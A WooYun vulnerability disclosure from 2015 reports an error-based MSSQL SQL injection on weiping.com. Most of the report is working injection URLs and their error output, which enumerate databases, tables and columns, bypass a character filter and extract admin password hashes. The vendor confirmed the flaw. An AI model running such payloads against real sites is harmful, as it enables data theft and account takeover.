{"id": 13101, "wybug_id": "wooyun-2015-0111927", "wybug_title": "返还网某站MSSQL报错注入已注出管理员数据（可垮裤，典型手工注入案例）", "wybug_corp": "返还网", "wybug_author": "goubuli", "wybug_date": "2015-06-11 02:49", "wybug_open_date": "2015-07-26 09:06", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "19", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-26：\t细节向公众公开  简要描述： RT 详细说明：  首先看一下这个站：http://www.weiping.com/\n\n随意查看某个用户，出现的链接URL为：http://www.weiping.com/用户名如注入点：http://www.weiping.com/zhengxq111随手一个'，爆出SQL及注入地方\n\n下面就好弄了1、构造语句在测试过程中发现过滤了：<、>、*等字符，后续会有绕过\nhttp://www.weiping.com/zhengxq111' and 要查的数据 and 'a'='a\n如：http://www.weiping.com/zhengxq111' and user=1 and 'a'='a\n\n\n在将 nvarchar 值 'fanhuan' 转换成数据类型 int 时失败。\n2、查数据库相关信息\nhttp://www.weiping.com/zhengxq111' and user=1 and 'a'='a\t\t\t\t\t\t\t\t在将 nvarchar 值 'fanhuan' 转换成数据类型 int 时失败。\n当前用户：fanhuan\nhttp://www.weiping.com/zhengxq111' and db_name()=1 and 'a'='a\t\t\t\t\t\t\t在将 nvarchar 值 'WeiPing' 转换成数据类型 int 时失败。\n当前库：WeiPing\nhttp://www.weiping.com/zhengxq111' and @@version=1 and 'a'='a\n\n\n数据库Microsoft SQL Server 2008 3、搞出所有数据库\nhttp://www.weiping.com/zhengxq111' and (SELECT count(Name) FROM Master..SysDatabases )=16  and 'a'='a\n一共16个数据库构造：\nhttp://www.weiping.com/zhengxq111' and (SELECT top 1 Name FROM Master..SysDatabases where name not in(select top XX name from Master..SysDatabases))=16  and 'a'='a\n查出所有数据库（数据库信息不贴出来了），只举一列\n\n4、搞出某个数据库的所有表构造\nhttp://www.weiping.com/zhengxq111' and (select count(name) from WeiPing..sysobjects where xtype='U')=28  and 'a'='a\n返回正常，WeiPing数据库一共28个数据表\nhttp://www.weiping.com/zhengxq111' and (select top 1 name from sysobjects where xtype='U' and id not in(select top XX id from sysobjects where xtype='U'))=1  and 'a'='a\n如：\nhttp://www.weiping.com/zhengxq111' and (select top 1 name from sysobjects where xtype='U' and id not in(select top 1 id from sysobjects where xtype='U'))=1  and 'a'='a\n在将 nvarchar 值 'WP_UserPluginData' 转换成数据类型 int 时失败。\n\n其他数据不贴5、搞出某个表的所有字段构造\nhttp://www.weiping.com/zhengxq111' and (SELECT top 1 c.name FROM WeiPing..syscolumns c,WeiPing..sysobjects s WHERE c.id=s.id AND s.name='KS_Comment')=1 and 'a'='a\n字段数查询类似3、4步骤，共20个字段，过程略如：\nhttp://www.weiping.com/zhengxq111' and (SELECT top 1 c.name FROM WeiPing..syscolumns c,WeiPing..sysobjects s WHERE c.id=s.id AND s.name='KS_Comment' and c.name not in ('ID','FatherID','UserName'))=1 and 'a'='a\n\n\n6、查表中数据这个比较简单构造\nhttp://www.weiping.com/zhengxq111' and (SELECT top 1 UserIP FROM KS_Comment)=1 and 'a'='a\n如：\n\n==========================垮裤在第3步中有一个数据库是：taobao那么垮裤，看看库里信息，先看有多少表？因为过滤了<>*等，这里用between绕过\nhttp://www.weiping.com/zhengxq111' and (select count(name) from taobao..sysobjects where xtype='U')  BETWEEN 45 and 47 and 'a'='a\n访问正常，说明表的数量在45(含)-47(含)之间\nhttp://www.weiping.com/zhengxq111' and (select count(name) from taobao..sysobjects where xtype='U')=45 and 'a'='a\n说明taobao数据库只有45张表查其中一个表\nhttp://www.weiping.com/zhengxq111' and (select top 1 name from taobao..sysobjects where xtype='U' and id not in(select top 12 id from taobao..sysobjects where xtype='U'))=1  and 'a'='a\n\n\n有一个AdminUser表看看字段有：\nUserIdParentIdUserNamePasswordFullNameMobileTelEmailTel...\n等字段看看数据\n\n\nUsername：qiulinPassword：6605ACBC1**************87A854BFullName：邱霖...\n不敢确定是否是管理员，再看下一条第二条：\n\n直接报出admin，这次应该是管理员了\nUsername：adminPassword：B814***********2BB174FullName：系统管理员\n接下来没有深入,问题就点到这里吧。。。没有去写脚本。。。只是想试试手工，这个站是一个很好的案例。声明：所有执行都是测试，没有任何破坏。   漏洞证明：  上面已证明不跟上面重复了，贴一个暴出的路径吧\n\n\nE:\\Other_2\\WP\\03_src\\LGFZ.Weping.Utility\\Databse\\DatabaseTextUtility.cs\n   修复方案：  迅速修补   版权声明：转载请注明来源 goubuli@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-06-11 09:05 厂商回复： 存在SQL注入,对数据的安全性产生较大的影响 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-05-05 13:05 |    \t\t天地不仁 以万物为刍狗 \t\t\t( 普通白帽子  |\t\t\t        Rank:977 漏洞数:264        | 天地本不仁 万物为刍狗)\t\t \n  看见手工注入  我就关注了    \n     2015-05-05 14:17 |    \t\tgoubuli \t\t\t( 普通白帽子  |\t\t\t        Rank:324 漏洞数:61        )\t\t \n  @天地不仁 以万物为刍狗  手工是个体力活    \n     2015-06-12 09:48 |    \t\tsauren \t\t\t( 实习白帽子  |\t\t\t        Rank:34 漏洞数:10        | 天天打DOTA，快乐你我他~)\t\t \n  哦？    \n     2015-07-26 10:10 |    \t\tBeenQuiver \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:26        | 专注而高效，坚持好的习惯千万不要放弃)\t\t \n  mark    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}